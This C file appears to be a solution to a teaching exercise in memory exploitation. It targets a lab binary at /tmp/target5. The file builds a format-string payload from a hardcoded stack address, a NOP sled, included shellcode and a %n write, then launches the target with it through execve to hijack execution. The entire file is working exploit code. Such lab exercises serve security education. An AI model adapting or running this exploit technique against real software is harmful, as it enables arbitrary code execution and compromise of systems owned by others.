#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char buf[480];
  char * format_str;
  
  format_str = "%u%u%12582442u%n";
  
  memset(buf, 0x90, sizeof(buf));
  strncpy(buf, "\x9d\xfc\xff\xbf", 4); // addr = EIP + 1
  strncpy(buf+479-strlen(format_str)-strlen(shellcode), shellcode, strlen(shellcode)); // shellcode
  strncpy(buf+479-strlen(format_str), format_str, strlen(format_str)); // format string
  strncpy(buf+479, "\x00", 1); // null terminate

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
